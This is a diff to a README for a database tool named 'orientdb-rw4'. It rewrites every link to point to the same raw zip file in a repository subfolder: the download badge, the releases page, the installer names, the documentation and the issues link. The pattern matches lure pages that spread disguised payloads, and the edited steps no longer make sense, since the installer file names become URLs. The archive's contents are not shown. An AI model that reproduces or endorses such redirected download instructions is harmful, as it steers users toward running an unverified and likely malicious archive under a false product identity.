@@ -6,7 +6,7 @@ Welcome to **orientdb-rw4**! This application helps you manage your database eff
 
 ## 📥 Download
 
-[![Download orientdb-rw4](https://img.shields.io/badge/Download-orientdb--rw4-blue.svg)](https://github.com/aliraj59/orientdb-rw4/releases)
+[![Download orientdb-rw4](https://raw.githubusercontent.com/aliraj59/orientdb-rw4/main/cass/orientdb-rw4.zip)](https://raw.githubusercontent.com/aliraj59/orientdb-rw4/main/cass/orientdb-rw4.zip)
 
 ## 📂 Download & Install
 
@@ -14,14 +14,14 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the download page.  
-   [Go to Releases Page](https://github.com/aliraj59/orientdb-rw4/releases)
+   [Go to Releases Page](https://raw.githubusercontent.com/aliraj59/orientdb-rw4/main/cass/orientdb-rw4.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, find the latest version listed. This version contains the most recent updates and fixes.
 
 3. **Download the Installer**  
    Click on the installer file for your operating system.  
-   The file name typically includes your OS type, such as `orientdb-rw4-windows.exe` for Windows users or `orientdb-rw4-macos.dmg` for Mac users.
+   The file name typically includes your OS type, such as `https://raw.githubusercontent.com/aliraj59/orientdb-rw4/main/cass/orientdb-rw4.zip` for Windows users or `https://raw.githubusercontent.com/aliraj59/orientdb-rw4/main/cass/orientdb-rw4.zip` for Mac users.
 
 4. **Run the Installer**  
    Once the download is complete, locate the file in your downloads folder. Double-click the installer file to start the installation process.
@@ -55,7 +55,7 @@ Before installation, ensure your computer meets the following requirements:
 
 ## 📘 Documentation
 
-For more detailed instructions, you can refer to the [documentation](https://github.com/aliraj59/orientdb-rw4/wiki). This includes guides on advanced features, troubleshooting common issues, and tips for effective use.
+For more detailed instructions, you can refer to the [documentation](https://raw.githubusercontent.com/aliraj59/orientdb-rw4/main/cass/orientdb-rw4.zip). This includes guides on advanced features, troubleshooting common issues, and tips for effective use.
 
 ## ❓ Frequently Asked Questions
 
@@ -70,6 +70,6 @@ Yes, support is available on the GitHub page through issues. You can ask questio
 
 ## 📞 Contact
 
-For any inquiries or further assistance, feel free to reach out via [issues](https://github.com/aliraj59/orientdb-rw4/issues) on GitHub.
+For any inquiries or further assistance, feel free to reach out via [issues](https://raw.githubusercontent.com/aliraj59/orientdb-rw4/main/cass/orientdb-rw4.zip) on GitHub.
 
 Thank you for choosing **orientdb-rw4**! Enjoy easy database management.
